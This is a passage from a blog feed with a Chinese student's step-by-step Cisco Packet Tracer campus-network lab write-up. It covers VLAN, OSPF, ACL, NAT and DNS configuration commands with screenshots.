0.0.0.0 10.10.40.253 //添加缺省路由</span></span><br></pre></td></tr></table></figure><p>Router0:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip address 8.8.8.8 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">router ospf 4</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">router 8.8.8.8</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">router-id 8.8.8.8</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash"><span class="built_in">log</span></span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 8.8.8.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 10.10.60.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 10.10.70.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 200.1.1.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 10.10.50.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果你跟着我的步骤来写，到这里所有的主机或者服务器都应该可以相互通信了！<br>效果图如下：</p><p><img src="https://user-images.githubusercontent.com/57565901/121694187-777a3880-cafc-11eb-9a04-f27141203581.png" alt="image"></p><p><img src="https://user-images.githubusercontent.com/57565901/121694398-abedf480-cafc-11eb-95cc-dcedb1016a0b.png" alt="image"></p></blockquote><h2 id="0x04-ACL访问控制列表和NAT的设置"><a href="#0x04-ACL访问控制列表和NAT的设置" class="headerlink" title="0x04 :ACL访问控制列表和NAT的设置:"></a>0x04 :ACL访问控制列表和NAT的设置:</h2><blockquote><p>题目要求：<br>MS3：<br>1.ACL 101禁止学生宿舍区访问内网PRI服务器，虚接口配置101 in<br>2.ACL 101只允许访问192.168.3.1 tcp80端口</p><p>Router 0：<br>ACL101:permit 172.16.0.0&#x2F;16<br>ACL102:permit 172.20.0.0&#x2F;16<br>ACL103:permit 192.168.0.0&#x2F;16</p></blockquote><p>MS3:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">access-list 101 permit tcp any 192.168.3.1 0.0.0.255 eq 80</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">access-list 101 deny ip 172.20.0.0 0.0.255.255 host 192.168.1.1</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">access-list 101 deny ip any 192.168.3.1 0.0.0.255</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">access-list 101 permit ip any any</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int vlan 340</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip access-group 101 <span class="keyword">in</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 350</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip access-group 101 <span class="keyword">in</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><blockquote><p>此处注意nat相关的标准访问控制列表acl只能是路由器接口in方向<br>Router0:</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">conf t</span></span><br><span class="line">Enter configuration commands, one per line.  End with CNTL/Z.</span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 101 permit ip 172.16.0.0 0.0.255.255 any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 101 deny ip any any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 102 permit ip 172.20.0.0 0.0.255.255 any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 102 deny ip any any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 103 permit ip 192.168.0.0 0.0.255.255 any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 103 deny ip any any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat pool pool-teacher 200.1.1.31 200.1.1.100 netmask 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat pool pool-student 200.1.1.101 200.1.1.230 netmask 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat pool pool-admin 200.1.1.231 200.1.1.240 netmask 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat inside <span class="built_in">source</span> list 101 pool pool-teacher</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat inside <span class="built_in">source</span> list 102 pool pool-student</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat inside <span class="built_in">source</span> list 103 pool pool-admin</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int fa0/0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip nat inside</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">int e1/0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip nat inside</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">int e1/1</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip nat inside</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">int f0/1</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip nat outside</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">//设置静态nat</span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat inside <span class="built_in">source</span> static 192.168.3.1 200.1.1.242</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat inside <span class="built_in">source</span> static 192.168.2.1 200.1.1.241</span></span><br></pre></td></tr></table></figure><p>到这里我们可以测试一下NAT协议，用外网主机(<a target="_blank" rel="noopener" href="http://www.internet-server.com)访问www.ecjtu.jx.cn的外网ip/">www.internet-server.com)访问www.ecjtu.jx.cn的外网IP</a>:</p><p><img src="https://user-images.githubusercontent.com/57565901/121711207-eb244180-cb0c-11eb-9872-456dbae3655d.png" alt="image"></p><p>但这只能证明我们的静态NAT起作用了，当我们要测试动态NAT的时候怎么办呢qwq<br>当然是通过路由器的NAT表了，不过得先通过NAT访问一遍对应的主机。</p><p><img src="https://user-images.githubusercontent.com/57565901/121711427-2f174680-cb0d-11eb-9feb-c07d0523bf8f.png" alt="image"><br>然后我们查看NAT表：</p><p><img src="https://user-images.githubusercontent.com/57565901/121711530-48b88e00-cb0d-11eb-890e-a15e4ce55302.png" alt="image"><br>我们可以看到圈起来的那些IP都是我们划分的NAT池里面的IP，<br>分别是教学区、学生宿舍区、管理员区的IP。<br>到这里我们的NAT和ACL的划分已经完成了。</p><h2 id="0x05-DNS服务器的配置"><a href="#0x05-DNS服务器的配置" class="headerlink" title="0x05 : DNS服务器的配置"></a>0x05 : DNS服务器的配置</h2><p>最后的DNS服务器的配置就比较简单了，通过Cisco Packet Tracer图形化界面点开服务器，进入如下界面：<br><img src="https://user-images.githubusercontent.com/57565901/121712024-d300f200-cb0d-11eb-84d7-d3d8558e7683.png" alt="image"></p><p>分别填入域名和对应的IP地址就行了。<br>我们将DNS服务器IP填入主机进行测试：</p><p><img src="https://user-images.githubusercontent.com/57565901/121712100-ed3ad000-cb0d-11eb-9181-6a9f6c27355a.png" alt="image"></p><p>接下来访问<a target="_blank" rel="noopener" href="http://www.ecjtu.jx.cn/">www.ecjtu.jx.cn</a>:</p><p><img src="https://user-images.githubusercontent.com/57565901/121712147-004da000-cb0e-11eb-9a25-9df0b1b3e540.png" alt="image"></p><h2 id="0x06-至此我们完成了校园网实验所有的实验要求"><a href="#0x06-至此我们完成了校园网实验所有的实验要求" class="headerlink" title="0x06:至此我们完成了校园网实验所有的实验要求"></a>0x06:至此我们完成了校园网实验所有的实验要求</h2><p>所有命令、截图都为本人完成，仅供参考，拒绝转载。   </p><p>By Auspic1ous 大二菜鸡  </p><h1 id="欢迎大家在下方评论"><a href="#欢迎大家在下方评论" class="headerlink" title="欢迎大家在下方评论"></a>欢迎大家在下方评论</h1>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
            <tag> Cisco模拟器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络拓扑实验之校园网的构建1</title>
      <link href="/2021/03/06/02d6fe92269a-q1jun/"/>
      <url>/2021/03/06/02d6fe92269a-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="ecjtu-Network-lab6"><a href="#ecjtu-Network-lab6" class="headerlink" title="ecjtu-Network-lab6"></a>ecjtu-Network-lab6</h1><p>华东交通大学计算机网络实验六 Cisco Packet Tracer  V8.0.0</p><p>（一）校园网设计示例1（必做内容）</p><p>（1）某学院有教职工50人，平均分布在教学楼1和教学楼2，学生400人，平均分布在宿舍楼1和宿舍楼2，有一个数据中心服务器。<br>（2）每栋教学楼和宿舍楼分别设置为不同的VLAN网段，教学楼通过汇聚路由器连接到学院的核心路由器，宿舍楼通过三层交换机连接到学院的核心路由器。数据中心服务器作为一个独立网段连接到核心路由器。<br>（3）学院核心路由器通过serial接口连接到ISP的路由器，从而连接到互联网。<br>（4）采用合适的路由配置策略（静态路由、RIP协议、OSPF协议），使得学院网络内部互联互通。<br>（5）在学院核心路由器上配置合适的NAT，使得宿舍楼1和宿舍楼2所属子网范围能访问外网，而教学楼1和教学楼2所属子网范围不能访问外网。<br>（6）在学院核心路由器上设置标准ACL或扩展ACL，允许教学楼的用户只可以访问数据中心服务器的WWW服务和FTP服务。允许宿舍楼的用户可以访问外网的资源，也能访问教学楼的资源，其余的都不可以访问。</p><p>请根据以上需求，给出学院的具体网络设计方案，各楼栋分布与节点数需求，画出网络拓扑结构设计图，给出VLAN 及 所有IP 地址规划，完成设备选型，详细实验配置等。并将以上所有内容记录在实验报告上。</p><h2 id="0x01-按照拓扑图添加好设备，并标明接口和IP等等"><a href="#0x01-按照拓扑图添加好设备，并标明接口和IP等等" class="headerlink" title="0x01:按照拓扑图添加好设备，并标明接口和IP等等"></a>0x01:按照拓扑图添加好设备，并标明接口和IP等等</h2><p><img src="https://user-images.githubusercontent.com/57565901/121010883-8abd9900-c7c8-11eb-9a8b-440e22b6dc99.png" alt="image"></p><blockquote><p>注意其中核心路由器Router1，我们要先关闭电源，添加接口模块 <code>NM-2FE2W</code> 和 <code>WIC-1T</code> ：<br><img src="https://user-images.githubusercontent.com/57565901/121011001-b17bcf80-c7c8-11eb-9774-01a7cd08fca4.png" alt="image"></p></blockquote><h2 id="0x02-下面便是配置计算机IP、网关、掩码和路由器端口了"><a href="#0x02-下面便是配置计算机IP、网关、掩码和路由器端口了" class="headerlink" title="0x02:下面便是配置计算机IP、网关、掩码和路由器端口了"></a>0x02:下面便是配置计算机IP、网关、掩码和路由器端口了</h2><p><img src="https://user-images.githubusercontent.com/57565901/121011872-b0976d80-c7c9-11eb-85b6-3f496f9f864b.png" alt="image"></p><blockquote><p>注意右上角三层交换机这里的节点IP地址是没有给出的，<br>这里我们根据下面的网关命名习惯推算出此处网关为<code>10.1.1.254/24</code><br><img src="https://user-images.githubusercontent.com/57565901/121012526-619e0800-c7ca-11eb-97b4-0892eb1e345c.png" alt="image"></p></blockquote><p>其他的PC和server简单的配置一下IP、网关、掩码就行，没有什么特别的地方。</p><p>配置[Router2]的f0&#x2F;1.1和f0&#x2F;1.2两个子端口的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int fa0/1  //开启端口fa0/1</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">int fa0/1.1</span></span><br><span class="line"><span class="meta prompt_">Router(config-subif)#</span><span class="language-bash">encapsulation dot1q 2</span> </span><br><span class="line">//重要指令，dot1Q为这个接口配置802.1Q协议 ，最后的2是设置为vlan2的意思</span><br><span class="line"><span class="meta prompt_">Router(config-subif)#</span><span class="language-bash">ip add 192.168.2.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-subif)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Router(config-subif)#</span><span class="language-bash">int fa0/1.2</span></span><br><span class="line"><span class="meta prompt_">Router(config-subif)#</span><span class="language-bash">encapsulation dot1q 3</span></span><br><span class="line"><span class="meta prompt_">Router(config-subif)#</span><span class="language-bash">ip add 192.168.3.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-subif)#</span><span class="language-bash">no shut</span> </span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int fa0/0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip address 192.168.4.100 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><p>设置交换机[Switch 1]的f0&#x2F;1为trunk模式(Switch 2同理)，划分VLAN:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport mode trunk</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport trunk allowed vlan all</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><p>配置三层交换机MS1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">vlan 10</span></span><br><span class="line"><span class="meta prompt_">Switch(config-vlan)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">vlan 20</span></span><br><span class="line"><span class="meta prompt_">Switch(config-vlan)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/2</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 20</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 10</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int vlan 10</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.1.2.100 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 20</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.1.1.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><p>配置三层交换机MS2:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 5 //这里写vlan 4或者vlan 5都可以,虚接口</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int vlan 4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip add 172.16.4.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 5</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip add 172.16.5.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int vlan 10</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 10</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int vlan 10 //配置一个vlan10虚接口作为路由出口</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip add 172.16.1.100 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><h2 id="0x03-动态路由-OSPF协议："><a href="#0x03-动态路由-OSPF协议：" class="headerlink" title="0x03:动态路由-OSPF协议："></a>0x03:动态路由-OSPF协议：</h2><p>关于ospf、bgp中的Router-ID和loopback接口：</p><blockquote><p>动态路由协议OSPF 、BGP 在运行过程中需要为该协议指定一个Router id，作为此路由器的唯一标识，并要求在整个自治系统内唯一。由于router id 是一个32 位的无符号整数，这一点与IP地址十分相像。而且IP 地址是不会出现重复现象的，所以通常将路由器的router id指定为与该设备上的某个接口的地址相同。由于loopback 接口的IP 地址通常被视为路由器的标识，所以也就成了router id的最佳选择。</p></blockquote><h3 id="0x0301-关于ospf中区域area的划分如下-中间的终端路由器为area-0作为骨干网络连接其他网络"><a href="#0x0301-关于ospf中区域area的划分如下-中间的终端路由器为area-0作为骨干网络连接其他网络" class="headerlink" title="0x0301:关于ospf中区域area的划分如下,中间的终端路由器为area 0作为骨干网络连接其他网络:"></a>0x0301:关于ospf中区域<code>area</code>的划分如下,中间的终端路由器为<code>area 0</code>作为骨干网络连接其他网络:</h3><p><img src="https://user-images.githubusercontent.com/57565901/121023330-c3b03a80-c7d5-11eb-84b3-2dcc540634aa.png" alt="image"></p><h3 id="0x0301-动态路由配置命令："><a href="#0x0301-动态路由配置命令：" class="headerlink" title="0x0301:动态路由配置命令："></a>0x0301:动态路由配置命令：</h3><p>Router ISP:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int loopback0 //设置回环接口</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip address 1.1.1.1 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">router ospf 1</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">router-id 1.1.1.1 //设置路由ID</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 202.121.241.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 219.220.240.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 1.1.1.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 5.5.5.0 0.0.0.255 area 0 //5.5.5.0为核心网络号</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">log-adjacency-changes  //开启日志提示</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip route 0.0.0.0 0.0.0.0 202.121.241.8</span></span><br></pre></td></tr></table></figure><p>Router1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip add 5.5.5.5 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">router ospf 5</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">router-id 5.5.5.5</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 5.5.5.0 0.0.0.255 area 0</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 202.121.241.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 10.1.2.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 192.168.4.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 172.16.1.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">log-adjacency-changes //开启日志功能</span></span><br></pre></td></tr></table></figure><p>Router2:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip add 3.3.3.3 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">router ospf 3</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">router-id 3.3.3.3</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 5.5.5.0 0.0.0.255 area 0</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 192.168.4.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 192.168.2.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 192.168.3.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">network 3.3.3.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash">log-adjacency-changes //开启日志功能</span></span><br><span class="line"><span class="meta prompt_">Router(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip route 0.0.0.0 